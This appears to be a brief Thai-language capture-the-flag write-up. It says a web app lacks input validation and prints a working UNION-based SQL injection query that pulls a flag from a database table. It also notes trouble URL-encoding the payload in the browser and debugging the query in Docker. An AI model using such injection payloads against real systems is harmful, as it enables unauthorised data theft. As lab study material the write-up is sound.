


![alt text](image-2.png)

ไม่มี validate imput ,sanitize input เลย ทำ SQL Injection ได้

![alt text](image-1.png)

![alt text](image.png)

SELECT * FROM inventory WHERE name LIKE '%%' UNION SELECT 1,flag,'','','2024-01-16 14:22:00' FROM flag; -- -%'

ปัญหาที่เจอ

![alt text](image-4.png)

พยายามไม่ใช้ burp url encode ทำ SQL payload บน browser เลย

![alt text](image-3.png)

รัน docker แล้ว console.log(`Executing query: ${sqlQuery}`); จะสังเกตว่า มันไม่ยอม decode ให้ น่าจะเจอ %% ติดกันแล้วงง

![alt text](image-5.png)

![alt text](image-6.png)



